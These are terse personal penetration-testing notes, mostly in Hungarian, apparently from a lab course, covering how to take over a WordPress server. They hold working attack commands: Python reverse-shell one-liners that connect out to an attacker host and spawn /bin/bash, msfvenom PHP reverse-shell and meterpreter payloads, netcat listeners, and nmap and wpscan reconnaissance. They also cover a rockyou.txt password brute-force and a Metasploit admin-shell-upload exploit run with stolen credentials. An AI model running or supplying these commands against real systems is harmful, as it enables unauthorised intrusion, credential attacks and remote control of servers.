/usr/share/wordlists/rockyou.txt  

msfvenom -l playloads

// listener
30.0.1.11
nc -lvnp 4444 ugyanazon a porton

// ip cím kiírása
ip a

// fájl csinálás msfvenom
msfvenom -p php/reverse_php LHOST=30.0.1.11 LPORT=4444 -f raw > shell.php

// chain shelling nem php és php esetén
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.11",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.11",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

// php esetén
nc -lvnp 4444 
msfvenom -p php/reverse_php LHOST=30.0.1.11 LPORT=4444 -f raw > shell.php // másik shellbe
chmod +x kriszshell.elf // másik shellbe
./kriszshell.elf listenerbe

// feltérképezés
sudo nmap -sS -sV 40.0.4.10

// egy weblap feltérképezése
dirbuster
/usr/share/wordlists/dirb/common.txt

//wordpress scan
wpscan 
-h
-o output file
-f format
--deteection-mode MODE mennyire erőszakosan próbálja felfedezni az oldalakat
aggresszív mód (jobban észrevesznek) passzív mód, alap beállítás kevert
--user-agent --rua random váltogatja a botokat
--http-auth login:password milyen login password kombóval tudja a wpscan átlépni az oldalt
--throttle milliseconds várakozás kattintás várakozás szimuláció
-e beállíthatjuk mire vagyunk kíváncsiak, 
  -vp vulnerable plugins
  -u user
  -at all themes
  -ap all plugins
-U username listája
  --login-rui URI ha zhn máshol található a login uri https://40.0.4.27 /secret
--stealthy


wpscan --url http://40.0.4.10 -e u,at,ap

wpscan --url http://40.0.4.10 --usernames admin --passwords /usr/share/wordlists/rockyou.txt 
ha < 5k akkor nem jelszót kell brute forceolni

comments.php-t kell szerkeszteni általában

msfconsole //metasploit exploitok msfvenom benne van
msfconsole search wordpress
search wordpress shell
a szám dinamkusan változik
wp admin shell upload
use exploit exploit/unix/webapp/wp_admin_shell_upload
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> options
nézni a yeseket module options
  rportot átírni ahol a website van
  targeturi
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set password finalfantasy
password => finalfantasy
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set rhosts 40.0.4.10
rhosts => 40.0.4.10
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set username admin
username => admin
meterpreter> shell
python3 -c "import pty;pty.spawn('/bin/bash')"


msfvenom -p php/meterpreter/reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f raw > metshell.php
msfconsole > use exploit/multi/handler // ez csak listener 
set payload php/meterpreter/reverse_tcp
run // olyan mint a netcates listener
